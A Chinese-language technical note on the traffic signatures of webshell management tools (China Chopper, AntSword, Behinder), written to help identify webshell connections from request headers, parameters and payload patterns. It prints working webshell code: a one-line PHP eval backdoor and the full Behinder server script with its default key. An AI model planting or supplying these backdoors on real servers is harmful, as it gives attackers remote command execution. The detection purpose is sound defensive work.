---
title: "webshell流量特征" 
weight: 10
bookToc: true
---

## 背景

webshell是以`php`、`jsp`等形式存在的一种命令执行环境，是网页后门，通过其可获得网站服务器。

一般上传的webshell木马只保留了执行环境的入口，可实现的功能如文件管理、终端控制等依赖客户端管理工具如蚁剑等实现。

这里我们分析常见的4中webshell连接工具的流量特征，其中`菜刀`和`蚁剑`可以连接常见的一句话木马，**这里的`pass`参数为所谓的连接密码**，工作过程强依赖`pass`参数传参。
```php
<?php @eval($_POST['pass']); ?>
```

`冰蝎`和`哥斯拉`是基于流量加密实现的，**此时所谓的连接密码为对应加解密的密钥（或尤其派生）**，请求体中的所有流量都会被加密，服务器端侧需要上传对应生成的webshell以能够解密。

## 中国菜刀

1. UA头
```
User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
```

2. payload base64编码，且存在固定的开头
```
QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2
```
对应
```php
@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);
// 关闭错误显示、设置不限时运行、关闭魔术引号
```
![](/data/image/web//flow/image.png)

3. 请求存在 `z0/z1/...` 参数
![](/data/image/web//flow/image-1.png)

4. 响应使用 `->| xxxx |<-` 封装
![](/data/image/web//flow/image-2.png)

## 蚁剑

1. 参数名随机`d43729c7e26d7d`等

2. 存在 `@ini_set("display_errors","0");@set_time_limit(0);`

3. payload存在简单的混淆，执行的命令会被base64编码，且需要去除前2个字节，最终执行的命令是`$r = "{$p} {$c}";`类似`cmd.exe /c "xxx"`
![](/data/image/web//flow/image-3.png)
![](/data/image/web//flow/image-4.png)
![](/data/image/web//flow/image-5.png)

4. 因为执行命令时加了`echo xxx`的随机打印，所有返回会有对应随机的输出
![](/data/image/web//flow/image-6.png)

## 冰蝎

1. php服务器端webshell如下（位于安装目录的`server`目录下），解密密钥为`e45e329feb5d925b`，通过`md5("rebeyond")[0:16`]得到，其中`rebeyond`是冰蝎3.0的默认密码。无密钥无法从流量层面进行解密。
```php
<?php
@error_reporting(0);
session_start();
    $key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
	$_SESSION['k']=$key;
	session_write_close();
	$post=file_get_contents("php://input");
	if(!extension_loaded('openssl'))
	{
		$t="base64_"."decode";
		$post=$t($post."");
		
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(),$params);
?>
```
2. 连接成功后会默认显示`phpinfo`信息页面
![](/data/image/web//flow/image-7.png)

3. 如使用默认密钥，请求中会有固定的`3Mn1yNMtoZViV5wotQHPJtwwj`；响应中会有固定的`mAUYLzmqn5QPDkyI5lvSp0fjiBu1e7047Yj`。
![](/data/image/web//flow/image-8.png)

4. 人工解密参看如下：

请求：![](/data/image/web//flow/image-9.png)
响应：![](/data/image/web//flow/image-10.png)

## 哥斯拉

TODO